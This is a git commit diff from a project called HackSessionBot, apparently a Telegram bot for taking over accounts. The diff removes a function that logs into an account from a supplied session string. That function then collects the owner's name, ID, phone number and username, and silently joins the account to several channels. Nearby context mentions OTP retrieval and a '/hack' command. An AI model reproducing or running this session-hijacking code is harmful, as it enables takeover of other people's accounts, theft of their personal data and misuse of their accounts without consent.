3f41696456bcade5125fa42d257b3714e30a5202
SaliraVoda <161962941+SaliraVoda@users.noreply.github.com>
2024-04-05 16:42:20 +0530

    Update steve.py

--- HackSessionBot/Helpers/steve.py
+++ HackSessionBot/Helpers/steve.py
@@ -69,32 +69,3 @@ async def get_otp(session):
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return i
-
-
-
-
-
-async def user_info(session):
-    err = ""
-    try:
-        if session.endswith("="):
-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
-            k = await steve.get_me()  
-            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
-            await steve.disconnect()
-    except Exception as idk:
-        err += str(idk)
-    
-    else:    
-        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-            try:
-                await stark.join_chat("@Devs_Testing_Group")
-                await stark.join_chat("@steve_projects")
-                await stark.join_chat(CHAT)
-            except Exception as e:
-                print(e)    
-            k = await stark.get_me()
-            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
-
-
